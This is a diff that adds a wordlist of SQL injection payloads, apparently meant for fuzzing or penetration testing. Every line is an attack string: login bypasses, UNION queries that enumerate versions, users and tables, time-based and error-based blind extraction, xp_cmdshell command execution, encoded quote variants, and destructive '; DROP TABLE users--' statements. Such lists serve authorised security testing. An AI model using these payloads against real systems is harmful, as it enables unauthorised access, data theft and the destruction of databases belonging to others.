@@ -1,0 +1,63 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+') OR ('1'='1' --
+admin'--
+admin' #
+admin'/*
+' OR 1=1 LIMIT 1--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' GROUP BY 1--
+1' GROUP BY 1,2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+1 AND 1=1
+1 AND 1=2
+1 AND SLEEP(5)--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+'; exec xp_cmdshell('ping 127.0.0.1')--
+'; DROP TABLE users--
+1; DROP TABLE users--
+' OR BENCHMARK(5000000,MD5(1))--
+' OR IF(1=1,SLEEP(5),0)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)
+admin' OR 1=1#
+1'='1
+"==""
+' OR ''='
+'='
+OR 1=1
+OR 1=1--
+OR 1=1#
+' OR 'x'='x
+'; SELECT * FROM users--
+' HAVING 1=1--
+' HAVING '1'='1
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+UNION SELECT @@version,NULL,NULL--
+UNION SELECT user(),NULL,NULL--
+UNION SELECT table_name,NULL FROM information_schema.tables--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=1 AND '1'='1
+0x27
+%27
+%2527
+%%2727
+%25%27
+\x27
